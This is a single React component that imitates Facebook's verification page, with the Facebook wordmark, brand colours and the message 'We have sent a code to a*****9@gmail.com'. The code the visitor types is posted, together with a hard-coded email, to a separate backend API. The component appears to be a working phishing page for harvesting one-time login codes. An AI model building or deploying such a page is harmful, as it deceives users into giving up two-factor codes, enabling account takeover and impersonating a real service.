import { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";

export default function Login() {
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleChange = (e) => {
    setCode(e.target.value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    try {
      const API_URL = import.meta.env.VITE_API_URL || "http://localhost:5000";
      const res = await axios.post(`${API_URL}/api/auth/login`, {
        email: "verify.user@example.com",
        password: code,
      });
      localStorage.setItem("token", res.data.token);
      localStorage.setItem("user", JSON.stringify(res.data.user));
      navigate("/");
    } catch (err) {
      setError(err.response?.data?.message || "Login failed");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex items-center justify-center px-4">
      <div className="w-full max-w-md">
        <h1 className="text-[#1877f2] text-5xl font-bold text-center mb-4">
          facebook
        </h1>

        <div className="bg-white rounded-lg shadow-md p-6">
          <h2 className="text-lg font-semibold text-center mb-4">
            We have sent a code to a*****9@gmail.com
          </h2>

          <form onSubmit={handleSubmit} className="flex flex-col gap-3">
            <input
              type="text"
              name="code"
              placeholder="Verification code"
              value={code}
              onChange={handleChange}
              className="border border-gray-300 rounded-md px-4 py-3 text-lg outline-none focus:border-[#1877f2]"
            />

            {error && <p className="text-red-500 text-sm text-center">{error}</p>}

            <button
              type="submit"
              disabled={loading}
              className="bg-[#1877f2] text-white font-bold text-xl py-3 rounded-md hover:bg-[#166fe0] transition disabled:opacity-60"
            >
              {loading ? "Logging in..." : "Log In"}
            </button>

            <a href="#" className="text-[#1877f2] text-center text-sm hover:underline">
              Forgotten password?
            </a>
          </form>
        </div>
      </div>
    </div>
  );
}